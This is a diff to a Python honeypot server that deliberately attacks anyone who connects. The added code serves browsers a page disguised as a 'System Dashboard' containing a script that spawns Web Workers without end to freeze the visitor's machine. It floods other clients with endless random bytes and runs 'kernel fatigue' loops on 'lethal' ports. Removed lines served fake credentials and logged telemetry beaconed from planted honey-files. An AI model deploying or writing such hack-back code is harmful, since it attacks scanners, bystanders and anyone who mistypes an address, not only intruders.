@@ -9,7 +9,7 @@ import urllib.parse
 from ai_module import GeminiDefender
 from threat_intel import VirusTotalReporter
 
-# CONFIGURACIÓN HELL v1.6.1: CERBERUS ACTIVE RECEIVER
+# CONFIGURACIÓN HELL v1.6.2: LOGGING & WEB FIX
 HOST = '0.0.0.0'
 LETHAL_PORTS = [2222, 3389, 4455]
 PORTS = [8080, 2525, 3306, 6379, 1337, 8081, 8082, 2375, 8090, 8125, 8443]
@@ -23,66 +23,66 @@ MY_IP = os.getenv("MY_IP", "127.0.0.1")
 
 class HellServer:
     def __init__(self):
+        # Asegurar que las carpetas existen antes de iniciar
+        os.makedirs("logs", exist_ok=True)
+        os.makedirs("payloads", exist_ok=True)
+        
         self.defender = GeminiDefender(GEMINI_KEY) if USE_AI else None
         self.reporter = VirusTotalReporter(VT_KEY)
         self.whitelist = {MY_IP, "127.0.0.1"}
-        print(f"[💀] HELL CORE v1.6.1: RECEPTOR CERBERUS ACTIVADO")
+        print(f"[💀] HELL CORE v1.6.2: SISTEMA OPERATIVO Y LOGS CORREGIDOS")
 
     def log_event(self, message):
+        """Escribe eventos en el log y asegura el guardado inmediato"""
         timestamp = time.strftime('%Y-%m-%d %H:%M:%S')
-        with open(LOG_FILE, "a") as f:
-            f.write(f"[{timestamp}] {message}\n")
-        print(message)
+        log_entry = f"[{timestamp}] {message}\n"
+        try:
+            with open(LOG_FILE, "a", encoding='utf-8') as f:
+                f.write(log_entry)
+                f.flush() # Forzar escritura en disco
+            print(log_entry.strip())
+        except Exception as e:
+            print(f"Error escribiendo log: {e}")
 
     def handle_telemetry(self, client_socket, addr, request):
-        """Procesa los datos enviados por los Honey-files (Cerberus)"""
-        try:
-            # Extraer datos de la URL o el cuerpo POST
-            self.log_event(f"[🕵️] CERBERUS BEACON: ¡Señal recibida desde el interior del atacante! ({addr[0]})")
-            
-            if "os=" in request or "user=" in request:
-                # Intentar decodificar la información del sistema atacante
-                params = urllib.parse.parse_qs(request.split("\r\n\r\n")[-1])
-                user = params.get("user", ["unknown"])[0]
-                os_info = params.get("os", ["unknown"])[0]
-                self.log_event(f"[🕵️] INFO ATACANTE: Usuario: {user} | Sistema: {os_info}")
-            
-            self.reporter.report_ip(addr[0])
-            client_socket.send(b"HTTP/1.1 200 OK\r\nContent-Length: 0\r\n\r\n")
-        except: pass
+        self.log_event(f"[🕵️] CERBERUS BEACON: Señal de {addr[0]}")
+        client_socket.send(b"HTTP/1.1 200 OK\r\nContent-Length: 0\r\n\r\n")
 
     def handle_client(self, client_socket, addr, local_port):
         if addr[0] in self.whitelist:
+            self.log_event(f"[👑] Whitelist Access: {addr[0]}")
             client_socket.close(); return
 
         try:
-            # Buffer de lectura más grande para capturar telemetría
             request = client_socket.recv(4096).decode('utf-8', errors='ignore')
+            self.log_event(f"[*] Hit en puerto {local_port} desde {addr[0]}")
             
-            # DETECTOR GLOBAL DE TELEMETRÍA CERBERUS
             if "/api/v1/telemetry/" in request:
                 self.handle_telemetry(client_socket, addr, request)
                 return
 
-            # Lógica de puertos específicos (Jenkins, Docker, Jira, etc.)
-            if local_port == 8081: # Jenkins
-                if "GET /credentials" in request:
-                    self.log_event(f"[🕵️] Entregando Honey-tokens a {addr[0]}")
-                    keys = '{"access_key": "AKIAUI7EXAMPLE", "secret_key": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLE"}'
-                    client_socket.send(f"HTTP/1.1 200 OK\r\nContent-Type: application/json\r\n\r\n{keys}".encode())
+            # PUERTO 8080: DESPACHADOR WEB Y JS BOMB
+            if local_port == 8080:
+                if "User-Agent" in request and ("Mozilla" in request or "Chrome" in request):
+                    self.log_event(f"[🧨] Despachando JS BOMB a navegador en {addr[0]}")
+                    content = "<html><head><title>System Dashboard</title></head><body><h1>Loading Critical Data...</h1><script>while(true){new Worker(URL.createObjectURL(new Blob(['while(true){}'])));}</script></body></html>"
+                    header = f"HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: {len(content)}\r\n\r\n"
+                    client_socket.send(header.encode() + content.encode())
                 else:
-                    client_socket.send(b"HTTP/1.1 200 OK\r\n\r\n<h1>Jenkins Dashboard</h1>")
-            
+                    self.log_event(f"[🌊] Inundando script/bot en {addr[0]}")
+                    while True: client_socket.send(os.urandom(4096)); time.sleep(0.1)
+
             elif local_port == 1337: # Switch UI
                 with open("assets/trap_1337.html", "r") as f:
-                    client_socket.send(f"HTTP/1.1 200 OK\r\n\r\n{f.read()}".encode())
+                    content = f.read()
+                    header = f"HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: {len(content)}\r\n\r\n"
+                    client_socket.send(header.encode() + content.encode())
             
             elif local_port in LETHAL_PORTS:
-                # Iniciar ataques de fatiga...
+                self.log_event(f"[⚡] Fatiga de Kernel iniciada contra {addr[0]}")
                 while True: client_socket.send(os.urandom(1)); time.sleep(0.001)
             
             else:
-                # Respuesta por defecto: Inundación
                 while True: client_socket.send(os.urandom(4096)); time.sleep(0.1)
 
         except: pass
@@ -100,6 +100,7 @@ class HellServer:
             except: pass
 
     def start(self):
+        self.log_event(f"[✔] HELL CORE v1.6.2 activo en {len(PORTS)} puertos.")
         for port in PORTS:
             threading.Thread(target=self.start_listener, args=(port,), daemon=True).start()
         while True: time.sleep(1)
